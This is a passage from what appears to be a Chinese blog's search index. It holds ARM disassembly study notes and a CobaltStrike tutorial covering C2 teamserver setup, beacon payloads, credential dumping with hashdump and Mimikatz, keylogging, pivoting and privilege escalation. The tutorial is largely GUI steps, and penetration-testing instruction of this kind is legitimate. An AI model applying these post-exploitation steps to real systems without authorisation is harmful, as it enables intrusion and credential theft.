argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOVW argv, #0x4925 .text:00002A08 LDR R2, =(aArgc7 - 0x2A16) ; \"argc / 7\" .text:00002A0A MOVT R1, #0x2492 .text:00002A0E UMULL","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:4","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"取模 无符号 除数为2的幂 源代码 printf(\"argc % 8\", (unsigned int)argc % 8); arm-v7a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR R2, =(aArgc8 - 0x2A0E) ; \"argc % 8\" .text:00002A06 AND.W argv, argc, #7 .text:00002A0A ADD R2, PC ; \"argc % 8\" .text:00002A0C MOV argc, R2 ; format .text:00002A0E BLX printf .text:00002A12 MOVS R0, #0 .text:00002A14 POP {R7,PC} .text:00002A14 ; End of function main //R1 = argc \u0026 7 AND.W R1, argc, #7 总结 x % y = x \u0026 (2^ - 1) 除数为非2的幂 源代码 printf(\"argc % 9\", (unsigned int)argc % 9); arm-v7a .text:00002A00 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00002A00 EXPORT main .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOVW argv, #0x8E39 .text:00002A08 LDR R2, =(aArgc9 - 0x2A16) ; \"argc % 9\" .text:00002A0A MOVT R1, #0x38E3 .text:00002A0E UMULL.W R1, R3, argc, R1 .text:00002A12 ADD R2, PC ; \"argc % 9\" .text:00002A14 LSRS R1, R3, #1 .text:00002A16 ADD.W R1, R1, R1,LSL#3 .text:00002A1A SUBS R1, argc, R1 .text:00002A1C MOV argc, R2 ; format .text:00002A1E BLX printf .text:00002A22 MOVS R0, #0 .text:00002A24 POP {R7,PC} .text:00002A24 ; End of function main MOVW R1, #0x8E39 MOVT R1, #0x38E3 UMULL.W R1, R3, argc, R1 LSRS R1, R3, #1 //上面是除法运算,结果在R1中 ADD.W R1, R1, R1,LSL#3 SUBS R1, argc, R1 //余数 = 被除数 - 除数 * 商 有符号 除数为2的幂 源代码 printf(\"argc % 8\", argc % 8); arm-v7a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR R2, =(aArgc8 - 0x2A14) ; \"argc % 8\" .text:00002A06 ASRS argv, argc, #0x1F .text:00002A08 ADD.W R1, argc, R1,LSR#29 .text:00002A0C BIC.W R1, R1, #7 .text:00002A10 ADD R2, PC ; \"argc % 8\" .text:00002A12 SUBS R1, argc, R1 .text:00002A14 MOV argc, R2 ; format .text:00002A16 BLX printf .text:00002A1A MOVS R0, #0 .text:00002A1C POP {R7,PC} .text:00002A1C ; End of function main //R1 = argc \u003e\u003e 31 ASRS R1, argc, #31 //R1 = argc + R1 \u003e\u003e 29 //如果argc \u003e= 0, R1 = argc //如果argc \u003c 0, R1 = argc + 7 ADD.W R1, argc, R1,LSR#29 //R1 = R1 \u0026 ~7 BIC.W R1, R1, #7 //R1 = argc - R1 SUBS R1, argc, R1 总结 x \u003e= 0,x % y = x - x \u0026 ~(2^n - 1) x \u003c 0,x % y = x - (x + 2^n - 1) \u0026~(2^n - 1) 除数为非2的幂 源代码 printf(\"argc % 9\", argc % 9); arm-v7a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOVW argv, #0x8E39 .text:00002A08 LDR R2, =(aArgc9 - 0x2A16) ; \"argc % 9\" .text:00002A0A MOVT R1, #0x38E3 .text:00002A0E SMMUL.W R1, argc, R1 .text:00002A12 ADD R2, PC ; \"argc % 9\" .text:00002A14 ASRS R3, R1, #1 .text:00002A16 ADD.W R1, R3, R1,LSR#31 .text:00002A1A ADD.W R1, R1, R1,LSL#3 .text:00002A1E SUBS R1, argc, R1 .text:00002A20 MOV argc, R2 ; format .text:00002A22 BLX printf .text:00002A26 MOVS R0, #0 .text:00002A28 POP {R7,PC} .text:00002A28 ; End of function main MOVW argv, #0x8E39 MOVT R1, #0x38E3 SMMUL.W R1, argc, R1 ASRS R3, R1, #1 ADD.W R1, R3, R1,LSR#31 //上面是除法运算, R1为商 ADD.W R1, R1, R1,LSL#3 SUBS R1, argc, R1 //余数 = 被除数 - 商 * 除数 ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:5","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"分支 if 源代码 if (argc \u003e 0){ printf(\"argc \u003e 0\"); } else{ puts(\"argc \u003c= 0\"); } arm-v7a while 源代码 while (argc \u003c 10) { printf(\"%d\\n\", argc); argc++; } arm-v7a do-while 源代码 do { printf(\"%d\\n\", argc); argc++; } while (argc \u003c 10); arm-v7a Switch-case 这里只讨论做表的情况. 源代码 switch (argc) { case 1:{ printf(\"%d\", 1); break; } case 3:{ puts(\"3\"); break; } case 5:{ printf(\"%d\", 5); break; } case 9:{ printf(\"9\"); break; } } arm-v7a ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:6","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"函数 这一部分跟x86相差还是挺大的. 整型传参 源代码 int add1(int n1, int n2, int n3, int n4, int n5, int n6, int n7, int n8, int n9) { return n1 + n2 + n3 + n4 + n5 + n6 + n7 + n8 + n9; } int main(int argc, char *argv[]) { int n = add1(1, 2, 3, 4, 5, 6, 7, 8, 9); printf(\"%d\\n\", n); return 0; } arm-v7a 从上面可以看到,前4个整型参数放在寄存器R0-R3中,后面的参数就入栈了,整型返回值放在R0中. arm-v8a 从上面可以看到,前8个整型参数放在寄存器X0-X7中,后面的参数就入栈了,整型返回值放在X0中. 浮点传参 源代码 float add2(float f1, float f2, float f3, float f4, float f5, float f6, float f7, float f8, float f9) { return f1 + f2 + f3 + f4 + f5 + f6 + f7 + f8 + f9; } int main(int argc, char *argv[]) { float f = add2(1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0); printf(\"%f\\n\", f); return 0; } arm-v7a 从上面可以看到,浮点传参跟整型传参没有区别,前4个参数放R0-R3,后面的参数入栈,浮点返回值放在R0中. arm-v8a 从上面可以看到,前8个浮点参数,放浮点寄存器S0-S7,后面的浮点参数入栈,浮点返回值放在S0中. 混合传参 源代码 long long add3(int n1, float f2, int n3, float f4, int n5, float f6, int n7, float f8, int n9) { return n1 + f2 + n3 + f4 + n5 + f6 + n7 + f8 + n9; } int main(int argc, char *argv[]) { long long l = add3(1, 2.0, 3, 4.0, 5, 6.0, 7, 8.0, 9); printf(\"%ld\\n\", l); return 0; } arm-v7a 从上面可以看到,混合传参对32位没有影响,前4个参数放R0-R3中,后面的参数入栈,长整型的返回值放在R1 . arm-v8a 从上面可以看到,对于混合传参,64位的处理方式还是挺特别的,将整型参数放在X0-X7中,浮点参数放在S0-S7中,单从传参来说,没有办法区分谁是第一个参数,谁是第二个参数,除非有符号. 注意的小细节 源代码 long long add4(int n1, long long n2, float f3){ return n1 + n2 + f3; } int main(int argc, char *argv[]) { long long l = add4(1, 2, 3.0); printf(\"%ld\\n\", l); return 0; } arm-v7a 本例中,long long add4(int n1, long long n2, float f3); 按理来说n1放R0,n2放R2, R1, f3放R3. 但从上面的汇编代码来看,并没有用到寄存器R1, 也就是说64位整型,低32位放的应该是2的幂下标的寄存器,如R1 R0, R3 R2. 而不是像R2 R1这种的. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:7","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"变量 全局变量 源代码 int g_n1 = 100; int g_n2; int g_n3 = fun1(10, 20); __attribute__ ((constructor)) void myload(){ printf(\"myload\\n\"); g_n2 = 200; } __attribute__ ((destructor)) void myunload(){ printf(\"myunload\\n\"); } int main(int argc, char *argv[]) { printf(\"%d %d %d\\n\", g_n1, g_n2, g_n3); return 0; } 总结 全局变量初始化以及初始化函数在.init_array这个区段中. 反初始化函数在.fini_array这个区段中. 静态局部变量 源代码 void showStatic(int n) { static int nStatic = n; printf(\"%d\\n\", nStatic); } int main(int argc, char *argv[]) { showStatic(argc); return 0; } 总结 这部分跟x86一样,就不细述了. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:8","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"数组 一维数组 源代码 int main(int argc, char *argv[]) { int ary[5] = {1, 2, 3, 4, 5}; printf(\"%d %d\", ary[1], ary[argc]); return 0; } 总结 假设数组为ary[n] ary[x]寻址: 数组首地址 + x * sizeof(type) 二维数组 源代码 int main(int argc, char *argv[]) { int ary[2][3] = {1, 2, 3, 4, 5, 6}; int x = 0; int y = 0; scanf(\"%d\", \u0026x, \u0026y); printf(\"%d\", ary[x][y]); return 0; } 总结 假设数组为ary[M][N] ary[x][y]寻址: ary + x * sizeof(type[N]) + y * sizeof(type) ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:9","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"类 如果没有虚函数,类和结构体是没办法区分的. this指针 源代码 class Person{ public: Person(){ m_nAge = 10; m_nHeight = 20; }; ~Person(){}; int GetAge(){return m_nAge;} int GetHeight(){return m_nHeight;} private: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person person; return 0; } 总结 32位this指针放在R0,64位this指针放在X0 对象作为参数 源代码 class Person{ public: Person(){ m_nAge = 10; m_nHeight = 20; m_nWeight = 30; }; ~Person(){}; public: int m_nAge; int m_nHeight; int m_nWeight; }; void showPerson(Person person){ person.m_nAge = 100; printf(\"%d %d %d\\n\", person.m_nAge, person.m_nHeight, person.m_nWeight); } int main(int argc, char *argv[]) { Person person; showPerson(person); return 0; } 总结 将原类中的成员拷贝到一块内存区域,然后将该内存区域的首地址传进去 返回对象 源代码 class Person{ public: Person(){ m_nAge = 10; m_nHeight = 20; m_nWeight = 30; }; ~Person(){}; public: int m_nAge; int m_nHeight; int m_nWeight; }; Person getPerson(){ Person person; person.m_nAge = 100; person.m_nHeight = 200; person.m_nWeight = 300; return person; } int main(int argc, char *argv[]) { Person person = getPerson(); printf(\"%d %d %d\\n\", person.m_nAge, person.m_nHeight, person.m_nWeight); return 0; } 总结 多传一个存放类对象的地址进去 构造函数 源代码 class Person{ public: Person(){ puts(\"Person()\"); }; ~Person(){}; virtual int getAge(){return m_nAge;} virtual int getHeight(){return m_nHeight;} public: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person person; return 0; } 总结 类有虚函数,才可以识别构造函数 在构造函数中很明显的特征就是要填虚表地址, 还有一些特征比如说作用域内第一次调用,返回this指针 虚析构 源代码 class Person{ public: Person(){ puts(\"Person()\"); }; virtual ~Person(){}; virtual int getAge(){return m_nAge;} virtual int getHeight(){return m_nHeight;} public: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person *p = new Person; p-\u003e~Person();//这种没有释放空间 delete p; //这种要释放空间 return 0; } 总结 VS编译的x86需要传参来判断是不是需要释放空间, 而Clang编译的Arm却不是这样的,它生成了两个析构函数,一个释放空间,一个没有释放空间. 这样的话,析构就不需要传参了. 单重继承 源代码 class BaseHuman { public: BaseHuman() { m_nBase = 1000; } int m_nBase; }; class Person : public BaseHuman { public: Person() { puts(\"Person()\"); }; virtual ~Person() {}; virtual int getAge() { return m_nAge; } virtual int getHeight() { return m_nHeight; } public: int m_nAge; int m_nHeight; }; int main(int argc, char *argv[]) { Person person; return 0; } 总结 父类构造在填虚表之前, 成员对象构造在填虚表之后. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:10","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["渗透测试"],"content":"CobaltStrike ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:0:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"前置定义 C2: Command\u0026Control Server的简称,也就是命令与控制服务器. Listener: 攻击者在C2上运行的服务,可以监听Beacon的请求(check in). Beacon: 植入到受感染系统中的恶意程序,可以请求C2服务器并在受感染系统中执行命令. TeamServer: CobaltStrike的服务器组件,是配置和启动Listener的地方. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:1:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"安装 ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:2:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Windows环境配置示例 提前安装好jdk,将jdk中的bin目录添加到环境变量中. 切换到Cobaltstrike目录执行如下命令. //若目录下存在cobaltstrike.store文件,删除 //Keytool.exe 这个文件位于jdk的bin目录中 Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname \"CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth\" 执行命令. teamserver.bat 8.8.8.8 123456 8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码. 客户端双击cobaltstrike.bat,填写服务器外网IP和teamserver密码,即可登入. 需要注意的是,如果连不上,需要关掉teamserver所在的服务端的防火墙. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:2:1","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Linux环境配置示例 CD切换到Cobaltstrike目录. 执行命令 teamserver.bat 8.8.8.8 123456 8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码. 客户端运行命令. Javaw -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 填写服务器外网IP和teamserver密码,即可登入. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:2:2","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Listener与Payload生成 ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:3:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Listener介绍 Listener(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象,当被监视的对象发生情况时,立即采取相应的行动. 在许多的渗透测试工具中,例如empire,metasploit,cobaltstrike中都有Listener的存在.大家可以简单地理解为Listener就是用来接收目标主机权限的模块. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:3:1","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Listener创建 创建Listener的步骤：Cobaltstrike–\u003eListeners. 目前我使用的是CobaltStrike4.2版本,其中内置了 8个Listener. Beacon DNS Beacon HTTP Beacon HTTPS Beacon SMB Beacon TCP External C2 Foreign HTTP Foreign HTTPS Beacon:为cs内置监听器,也就是说,当我们在目标系统成功执行Payload以后,会弹回一个Beacon的shell给cs. Foreign:主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter或者 armitage的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:3:2","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Listener配置 选择Cobaltstrike–\u003eListeners,会打开一个标签页,选择Add并选择你要使用的Listener类型,配置好外网IP和端口(不能冲突)点击save即可保存.在以后生成Payload的过程中即可使用该监听器. HTTP Host(Stager): 控制HTTP Beacon的HTTP Stager的主机.仅当你将此payload与需要显式stager的攻击配对时,才使用此值. Profile: 你可以选择一个C2拓展文件变体.通过一个C2文件变体,你可以在一个文件中指定多个配置文件的变量.使用变体文件之后,你设置的每个HTTP或HTTPS监听器会有不同的网络流量指标. HTTP Port(C2): 设置你的HTTP Beacon回连的端口. HTTP Port(Bind): 指定你的HTTP Beacon payload web服务器绑定的端口.如果你要设置端口弯曲重定向器(例如,接受来自80或443端口的连接但将连接路由到团队服务器开在另一个端口上的连接,这样的重定向器),那么这些选项会很有用. HTTP Host Header: 如果被指定了,会影响你的HTTP stagers,并通过你的HTTP通信.这个选项 使得通过Cobalt Strike利用域名前置变得更加容易. HTTP Proxy: 为此payload指定一个显式的代理配置. 生成常规后门 无状态木马 场景 生成 需要注意的是:如果开启了防火墙会产生一个Windows安全警报.因此最好提前用cmd添加一个防火墙放行规则或关闭防火墙,随后便可将无状态的木马上传到内网的其他机器,运行后返回一个会话. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:3:3","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Beacon详解 右键目标interact来使用Beacon,我们用它来执行各种命令. 需要注意一下两点: CobaltStrike默认是60s和teamserver通信一次,这会让我们执行命令或进行其他操作响应很慢,可以通过sleep命令进行修改(如sleep 5, 5s和teamserver通信一次). 执行cmd命令的时候前面要加shell(如shell dir). ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:4:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"HTTP Beacon\u0026TCP Beacon 这两种beacon都是比较普通的,只不过是主机与teamserver的通信协议不同而已. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:4:1","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"SMB Beacon 简介 SMB Beacon通过管道(pipe)进行进程间的数据传递.管道通信的进程可以是本地主机上的两个进 程,也可以和远程主机上的进程通过网络进行通信.Windows将命名管道通信封装在SMB协议中.因此得名 SMB Beacon. 使用 这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接. 派生一个SMB Beacon方法:在Listner生成SMB Beacon. 在目标主机右键,Access-\u003eSpawn AS,弹窗后Lintener选择上面创建的SMB Beacon,或者直接在Beacon中使用命令spawn smb(smb为上面创建的Smb lintener的名字). 运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon. 当前是连接状态,你可以在Beacon上用link 命令连接他或者unlink 命令断开它。 ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:4:2","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"SSH Beacon 当内网有Linux时,CobaltStrike也是考虑到的,提供了sh连接,大家可以通过metasploit爆破内网的sh账号密码,然后用目标机的Beaco去连接就可以了. 目前有两种SSH Beacon连接方法: Beacon命令：ssh [target:port] [user] [password] SSH密匙连接: ssh [target:port] [user] [/path/to/key.pem] ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:4:3","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"凭据导出与存储 凭据说的通俗易懂一点,可以理解为目标机的账号,密码. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:5:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"hashdump导出 右键目标机-\u003eAccess-\u003eDump Hashes 以本次导出的凭据为例: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d2e84884968fe5d39b0066bb66e60c20::: 31d6cfe0d16ae931b73c59d7e0c089c0,为Guest用户的NTLM hash. 我们可以去cmd5等平台破解该NTLM密文. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:5:1","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Mimikatz导出 右键目标机-\u003eAccess-\u003eRun Mimikatz 当会话为管理员权限时,才能dump成功,如果权限很低,请先提权. 如上图所示,成功导出了某用户的明文密码. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:5:2","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"凭据存储 点击下图中的图标,即可查看曾经导出的凭据. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:5:3","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"文件管理 右键目标机-\u003eExplore-\u003eFile Browser ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:6:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"下载文件 右键目标文件-\u003eDownload 上述操作之后,还需点击下方的图标,选中要下载的文件,点击Sync Files才可将文件下载到本机. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:6:1","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"进程管理 右键目标机-\u003eExplore-\u003eProcess List 点击下方的图标,可以看到键盘记录的结果. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:7:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"端口扫描 右键目标机-\u003eExplore-\u003ePort Scan 点击下方图标,可查看端口扫描的结果. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:8:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Net View 该功能会显示当前域的计算机列表. 右键目标机-\u003eExplore-\u003eNet View ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:9:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"屏幕截图 右键目标机-\u003eExplore-\u003eScreenshot 点击下方图标,查看屏幕截图. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:10:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"浏览器代理 右键目标机-\u003eExplore-\u003eBrowser Pivot 配置好相关端口信息后,点击Launch 在浏览器中或者Windows中设置中配置代理 此时我们就可以用浏览器打开该目标机的内网服务. 可以使用browserpivot stop这个命令,关闭浏览器代理. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:11:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Web Delivery 此功能可以利用bitsadmin、exe、powershell、python实现快速上线目标主机,使用起来很方便. 点击下方的图标,配置好端口(不要和其他的重复)、Lintener、Type就点击Launch 将下方生成的命令在目标机器上执行,就可以实现一条命令快速上线了. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:12:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Socks 目前利用网络防火墙将组织内部的网络结构与外部网络如INTERNET中有效地隔离开来,这种方法正变得逐渐流行起来.这些防火墙系统通常以应用层网关的形式工作在网络之间,提供受控的TELNET、FTP、SMTP等的接入. Socks提供一个通用框架来使这些协议安全透明地穿过防火墙.说的简单明了一点,在渗透测试中,我们使用Socks技术,可以穿透进入目标机的内网,从而扩大我们的战果 右键目标机-\u003ePivoting-\u003eSocks Server ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:13:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"安装扩展 扩展是CobaltStrike一个极为重要的模块,它有效的丰富了CobaltStrike的功能. 选择菜单栏的CobaltStrike-\u003eScript Manager, 点击load,然后选择cna扩展文件即可. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:14:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"权限提升 右键目标机-\u003eAccess-\u003eElevate 配置好Listener,点击Launch即可 